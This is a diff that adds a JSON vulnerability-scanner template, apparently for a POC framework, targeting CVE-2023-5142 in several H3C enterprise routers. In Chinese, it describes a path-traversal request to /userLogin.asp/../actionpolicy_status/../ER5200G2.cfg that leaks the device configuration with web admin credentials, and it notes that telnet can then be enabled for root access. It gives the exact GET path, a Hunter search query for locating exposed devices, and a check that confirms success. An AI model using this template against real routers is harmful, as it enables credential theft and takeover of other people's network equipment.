@@ -1,0 +1,38 @@
+{
+  "product": "H3C",
+  "vul_name": "H3C多款企业路由器actionpolicy_status信息泄露漏洞",
+  "type": "信息泄漏",
+  "vul_id": [
+    "CVE-2023-5142"
+  ],
+  "level": 3,
+  "vul_desc": "漏洞位于/userLogin.asp页面，通过访问路径/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg，可获取设备配置文件，进而获得WEB管理账号及密码，通过WEB管理页面可以开启telnet管理服务并远程登录进行提权操作获得设备ROOT管理权限",
+  "version": "",
+  "note": "",
+  "search": {
+    "Hunter": "app.name=\"H3C Router Management\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_37113223/article/details/136162041",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "@base"
+        },
+        {
+          "body": "name"
+        }
+      ]
+    }
+  }
+}
